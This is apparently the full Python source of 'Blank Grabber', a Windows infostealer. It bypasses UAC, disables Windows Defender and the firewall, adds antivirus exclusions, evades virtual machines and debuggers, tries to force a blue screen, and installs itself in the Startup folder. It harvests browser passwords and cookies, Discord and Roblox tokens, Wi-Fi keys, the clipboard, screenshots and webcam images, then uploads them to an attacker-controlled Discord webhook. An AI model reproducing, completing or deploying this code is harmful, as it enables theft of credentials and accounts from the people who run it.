# UTF-8
# https://github.com/Blank-c/Blank-Grabber

WEBHOOK = "Do NOT Enter anything here! Enter your webhook in webhook.txt"

import os, sys
if os.name!="nt" or not hasattr(sys, "frozen"):
    os._exit(0)
import urllib3
http = urllib3.PoolManager()
import threading
import subprocess
import shutil
import base64
import json
import random
import time
import pyaes
import re
from requests import *
import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
from win32crypt import CryptUnprotectData
import traceback

if os.path.isfile(configfile := os.path.join(sys._MEIPASS, "config.json")):
    with open(configfile, encoding= "utf-8", errors= "ignore") as file:
        _config = json.load(file)
else:
    _config = {}
_errorlogs = []

PINGME = _config.get("PINGME", True) # Pings @everyone
VMPROTECT = _config.get("VMPROTECT", True) # Protect your grabber from VMs
BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber

def catch(func):
    def newfunc(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            trb = traceback.extract_tb(sys.exc_info()[2])[-1]
            _errorlogs.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
    return newfunc

def fquit():
    if BSOD:
        subprocess.run("taskkill /IM svchost.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM csrss.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM winnit.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM winlogon.exe /F", capture_output= True, shell= True)
    os._exit(0)

def wd_exclude(path= None):
    if path is None:
        if hasattr(sys, 'frozen'):
            path = sys.executable
        else:
            path = os.path.abspath(__file__)
    subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)

def disable_wd():
    windef = "powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off"
    subprocess.run(windef, shell= True, capture_output= True)

def generate(num=5, invisible= False):
    if not invisible:
        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
    else:
        return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))


def force_decode(b: bytes):
    return b.decode(json.detect_encoding(b))

def is_admin():
    s = subprocess.run("net session", shell= True, capture_output= True).returncode
    if s == 0:
        return True
    else:
        return False

def uac_bypass():
    subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"{os.path.abspath(sys.executable)}\" /f", shell= True, capture_output= True)
    subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
    subprocess.run("fodhelper.exe", shell= True, capture_output= True)
    subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
    os._exit(0)

class vmprotect:
    def __init__(self):
        if int(force_decode(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout).strip().split()[1])/1000000000 < 1.7:
            fquit()

        if force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250", "481E2042-A1AF-D390-CE06-A8F783B1E76A"]:
            fquit()

        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "j.seance", "a.monaldo"]:
            fquit()

        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076"]:
            fquit()

        tasks = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout)
        for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray"]:
            if banned_task in tasks.lower():
                kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
                if kill.returncode:
                    os._exit(0)
        
        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
        if r1.returncode != 1 and r2.returncode != 1:
            fquit()
        
        for p in ("D:\\Tools", "D:\\OS2", "D:\\NT3X"):
            if os.path.isdir(p):
                fquit()

        try:
            http.request("GET", f"https://blank{generate()}.in")
        except Exception:
            pass
        else:
            fquit()

        if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
                fquit()

class BlankGrabber:
    def __init__(self):
        self.http = http
        self.webhook = WEBHOOK
        self.getPKey()
        self.archive = os.path.join(os.getenv("temp"), f"Blank-{os.getlogin()}.zip")
        self.tempfolder = os.path.join(os.getenv("temp"), generate(10, True))
        self.system = os.path.join(self.tempfolder, "System")
        self.localappdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.chromefolder = os.path.join(self.localappdata, "Google", "Chrome", "User Data")
        try:
            os.makedirs(self.tempfolder, exist_ok= True)
            os.makedirs(self.system, exist_ok= True)
        except PermissionError:
            os._exit(0)
        threads = []
        self.tokens = []
        t = k = None
        self.passwords = self.cookies = self.roblocookies = []
        t = threading.Thread(target= lambda: self.getWifiPasswords())
        t.start()
        threads.append(t)
        t = threading.Thread(target= lambda: self.getip())
        t.start()
        threads.append(t)
        t = threading.Thread(target= lambda: self.webshot())
        t.start()
        threads.append(t)
        t = threading.Thread(target= lambda: self.misc())
        t.start()
        threads.append(t)
        if os.path.isfile(os.path.join(self.chromefolder, "Local State")):
            k = threading.Thread(target= lambda: self.getcookie())
            k.start()
            threads.append(t)
            t = threading.Thread(target= lambda: self.getpass())
            t.start()
            threads.append(t)
        if os.path.isfile(os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")):
            t = threading.Thread(target= lambda: self.crash_bd())
            t.start()
            threads.append(t)
        t = threading.Thread(target= lambda: self.getTokens())
        t.start()
        threads.append(t)
        t = threading.Thread(target= lambda: self.screenshot())
        t.start()
        threads.append(t)
        t = threading.Thread(target= lambda: self.minecraft_stealer())
        t.start()
        threads.append(t)
        if k is not None:
            k.join()
        t = threading.Thread(target= lambda: self.roblox_stealer())
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        self.errorReport()
        self.send()
    
    def errorReport(self):
        if len(_errorlogs):
            with open(os.path.join(self.tempfolder, "Error Logs.txt"), "w") as file:
                file.write("\n".join(_errorlogs))

    @catch
    def webshot(self):
        def is_monochrome(path):
            return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)

        call = subprocess.run("a.es -d -p blank cm.bam.aes", capture_output= True, shell= True, cwd= sys._MEIPASS)
        if call.returncode != 0:
            return
        subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
        if not os.path.isfile(os.path.join(sys._MEIPASS, "Webcam.bmp")):
            return
        if is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
            os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
            return
        with Image.open(os.path.join(sys._MEIPASS, "Webcam.bmp")) as img:
            img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
        os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
        os.remove(os.path.join(sys._MEIPASS, "cm.bam"))

    def getPKey(self):
        key = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout).strip()
        if len(key.split("-")) == 5:
            self.productKey = key

    @catch
    def copy(self, source, destination):
        try:
            shutil.copy(source, destination)
        except Exception:
            os.makedirs(os.path.dirname(destination), exist_ok= True)
            shutil.copy(source, destination)

    @catch
    def getWifiPasswords(self):
        profiles = []
        passwords = {}
        for line in force_decode(subprocess.run("netsh wlan show profile", shell= True, capture_output= True).stdout).strip().splitlines():
            if "All User Profile" in line:
                name= line[(line.find(":") + 1):].strip()
                profiles.append(name)

        for profile in profiles:
            found = False
            for line in force_decode(subprocess.run(f"netsh wlan show profile \"{profile}\" key=clear", shell= True, capture_output= True).stdout).strip().splitlines():
                if "Key Content" in line:
                    passwords[profile] = line[(line.find(":") + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = "(None)"
        profiles = []
        for i in passwords:
            profiles.append(f"Network: {i}\nPassword: {passwords[i]}")
        if profiles:
            with open(os.path.join(self.system, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write("\n----------------------------------------------------\n".join(profiles))

    @catch
    def getpass(self):
        subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
        subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
        os.remove(os.path.join(sys._MEIPASS, "pm.bam"))
        if not os.path.isfile(passfile := os.path.join(sys._MEIPASS, "Passwords.txt")):
            return
        with open(passfile, encoding= "utf-16", errors= "ignore") as file:
            passwords = file.read().strip().split("\n\n")
        self.passwords = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in passwords]
        if len(self.passwords) > 3:
            os.makedirs((directory := os.path.join(self.tempfolder, "Credentials")), exist_ok= True)
            with open(os.path.join(directory, "Browser Passwords.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write("\n\n".join(self.passwords))

    @catch
    def getcookie(self):
        subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
        subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
        os.remove(os.path.join(sys._MEIPASS, "ck.bam"))
        if not os.path.isfile(cookiefile := os.path.join(sys._MEIPASS, "Cookies.txt")):
            return
        with open(cookiefile, encoding= "utf-16", errors= "ignore") as file:
            cookies = file.read().strip().split("\n\n")
        self.cookies = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in cookies]
        if len(self.cookies) > 20:
            os.makedirs(directory := os.path.join(self.tempfolder, "Credentials"), exist_ok= True)
            with open(os.path.join(directory, "Browser Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write("\n\n".join(self.cookies))

    @catch
    def minecraft_stealer(self):
        if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
            return
        for i in os.listdir(mcdir):
            if not i.endswith((".json", ".txt", ".dat")):
                continue
            os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
            self.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))

    @catch
    def roblox_stealer(self):
        def check(cookie):
            headers = {"Cookie" : ".ROBLOSECURITY=" + cookie}
            try:
                r = json.loads(self.http.request("GET", "https://www.roblox.com/mobileapi/userinfo", headers= headers).data.decode())
            except json.JSONDecodeError:
                return
            data = f"Username: {r['UserName']}\nUserID: {r['UserID']}\nRobux: {r['RobuxBalance']}\nBuilders Club Member: {r['IsAnyBuildersClubMember']}\nPremium: {r['IsPremium']}\nThumbnail: {r['ThumbnailUrl']}\n\nCookie: {cookie}"
            self.roblocookies.append(data)

        temp = ["\n".join(self.cookies)]
        for i in ("HKCU", "HKLM"):
            rbxcmd = subprocess.run(f"powershell Get-ItemPropertyValue -Path {i}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY", capture_output= True, shell= True)
            if not rbxcmd.returncode:
                temp.append(force_decode(rbxcmd.stdout))
        for i in temp:
            for j in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", i):
                check(j)
        if len(self.roblocookies):
            os.makedirs(rbdir := os.path.join(self.tempfolder, "Gaming", "Roblox"), exist_ok= True)
            with open(os.path.join(rbdir, "Roblox Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write(("\n" + "Blank Grabber".center(50, "=")).join(self.roblocookies))

    @catch
    def crash_bd(self):
        bdasar = os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")
        if os.path.isfile(bdasar):
            os.remove(bdasar)

    @catch
    def tree(self, path, DName= None):
        if DName is None:
            DName = os.path.basename(path)
        PIPE = "???"
        ELBOW = "?????????"
        TEE = "?????????"
        tree = force_decode(subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout)
        tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
        tree = DName + "\n" + "\n".join(tree[3:])
        return tree.strip()

    def misc(self):
        @catch
        def directoryTree():
            output = {}
            for location in ["Desktop", "Documents" , "Downloads", "Music", "Pictures", "Videos"]:
                output[location] = self.tree(os.path.join(os.getenv("userprofile"), location))
            for i in output:
                os.makedirs(os.path.join(self.tempfolder, "Directories"), exist_ok= True)
                with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(output[i])

        @catch
        def clipboard():
            output = force_decode(subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout).strip()
            if len(output) > 0:
                with open(os.path.join(self.system, "Clipboard.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(output)

        @catch
        def getAV():
            output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
            if not output.returncode:
                output = force_decode(output.stdout).strip().splitlines()
                if len(output) >= 2:
                    output = output[2:]
                    with open(os.path.join(self.system, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                        file.write("\n".join(output))

        @catch
        def tasklist():
            output = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout).strip()
            with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
                tasklist.write(output)

        @catch
        def sysInfo():
            output = force_decode(subprocess.run("systeminfo", capture_output= True, shell= True).stdout).strip()
            with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
                file.write(output)
        
        directoryTree()
        clipboard()
        getAV()
        tasklist()
        sysInfo()

    @catch
    def getTokens(self):
        subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
        data = []
        paths = {
            "Discord": os.path.join(self.roaming, "discord"),
            "Discord Canary": os.path.join(self.roaming, "discordcanary"),
            "Lightcord": os.path.join(self.roaming, "Lightcord"),
            "Discord PTB": os.path.join(self.roaming, "discordptb"),
            "Opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(self.localappdata, "Amigo", "User Data"),
            "Torch": os.path.join(self.localappdata, "Torch", "User Data"),
            "Kometa": os.path.join(self.localappdata, "Kometa", "User Data"),
            "Orbitum": os.path.join(self.localappdata, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(self.localappdata, "CentBrowser", "User Data"),
            "7Sta": os.path.join(self.localappdata, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(self.localappdata, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(self.chromefolder),
            "Epic Privacy Browse": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
        }

        def RickRollDecrypt(path):
            @catch
            def decrypt_token(encrypted_token, key):
                return force_decode(pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16])

            encrypted_tokens = []
            with open(localstatepath, "r", errors= "ignore") as keyfile:
                try:
                    key = json.load(keyfile)["os_crypt"]["encrypted_key"]
                except Exception:
                    return
            if not os.path.exists(lvldbdir := os.path.join(path, "Local Storage", "leveldb")):
                return
            for file in os.listdir(lvldbdir):
                if not file.endswith((".log", ".ldb")):
                    continue
                else:
                    for line in [x.strip() for x in open(os.path.join(lvldbdir, file), errors="ignore").readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            if token.endswith("\\"):
                                token = (token[::-1].replace("\\", "", 1))[::-1]
                            if not token in encrypted_tokens:
                                encrypted_tokens.append(token)

            for token in encrypted_tokens:
                token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
                if token:
                    if not token in self.tokens:
                        self.tokens.append(token)

        def grabcord(path):
            for filename in os.listdir(path):
                if not filename.endswith((".log", ".ldb")):
                    continue
                for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"[\w]{24}\.[\w]{6}\.[\w]{40}", r"([\w]{26}\.[\w]{6}\.[\w]{38}"):
                        for token in re.findall(reg, line):
                            if not token in self.tokens:
                                self.tokens.append(token)

        token_threads = []

        for path in paths.items():
            localstatepath = os.path.join(path[1], "Local State")
            if not os.path.exists(path[1]):
                continue
            else:
                t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
                token_threads.append(t)
                t.start()
                nextPaths = force_decode(subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout).strip().splitlines()
                for path in nextPaths:
                    t = threading.Thread(target= lambda: grabcord(path))
                    token_threads.append(t)
                    t.start()

        for i in token_threads:
            i.join()

        for token in self.tokens:
                token = token.strip()
                r = self.http.request("GET", "https://discord.com/api/v9/users/@me", headers=self.headers(token))
                if r.status!=200:
                    continue
                r = json.loads(r.data.decode())
                user = r["username"] + "#" + str(r["discriminator"])
                id = r["id"]
                email = r["email"].strip() if r["email"] else "(No Email)"
                phone = r["phone"] if r["phone"] else "(No Phone Number)"
                verified=r["verified"]
                mfa = r["mfa_enabled"]
                nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=self.headers(token)).data.decode())
                has_nitro = len(nitro_data)>0

                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nToken: {token}\nMFA: {'Yes' if mfa else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
        if len(data)!= 0:
            os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
            with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
                file.write("\n\n".join(data))

    @catch
    def screenshot(self):
        image = ImageGrab.grab()
        image.save(os.path.join(self.system, "Screenshot.png"))

    def headers(self, token=None):
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers["authorization"] = token

        return headers

    @catch
    def getip(self):
        try:
            r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
            if r.get("status") != "success":
                raise Exception("Failed")
            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
            if len(r["reverse"]) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
        self.ipinfo = data

    @catch
    def zip(self):
        shutil.make_archive(self.archive.rsplit(".", 1)[0], "zip", self.tempfolder)

    def send(self):
        self.zip()
        payload = {
  "content": "@everyone" if PINGME else "",
  "embeds": [
    {
      "title": "Blank Grabber",
      "description": f"```fix\n{self.ipinfo}```\n**Files: **```fix\n{self.tree(self.tempfolder, 'Blank Grabber')}```",
      "url": "https://github.com/Blank-c/Blank-Grabber/",
      "color": 16737536,
      "footer": {
        "text": "Grabbed By Blank Grabber!"
      }
    }
  ],
  "username": "Blank Grabber",
  "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
}

        self.webhook = force_decode(base64.b85decode(self.webhook.encode()))
        self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
        with open(self.archive,"rb") as file:
            self.http.request("POST", self.webhook, fields= {"file": (self.archive, file.read())}, headers= {"user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"})

        try:
            os.remove(self.archive)
            shutil.rmtree(self.tempfolder)
        except Exception:
            pass
        os._exit(0)

if __name__ == "__main__":
    if not is_admin():
        uac_bypass()
    t = threading.Thread(target= disable_wd)
    t.start()
    time.sleep(1)
    while True:
        try:
            r = json.loads(http.request("GET", "https://httpbin.org/get?1=2").data.decode())
            if r.get("args").get("1") != "2":
                os._exit(1)
            if VMPROTECT:
                try:
                    vmprotect()
                except UnicodeDecodeError:
                    pass
                except Exception:
                    os._exit(1)
            frozen = hasattr(sys, "frozen")
            if frozen and STARTUP:
                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                    try:
                        exepath = os.path.join("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", f"ScreenSaver-{generate()}.scr")
                        BlankGrabber.copy("Blank", sys.executable, exepath)
                        wd_exclude(exepath)
                    except Exception:
                        pass

            if frozen and HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
                subprocess.run(f"attrib \"{sys.executable}\" +s +h", shell= True, capture_output= True)
            try:
                wd_exclude()
                t.join()
                BlankGrabber()
            except Exception:
                pass
        except Exception:
            time.sleep(900) #15 Minutes
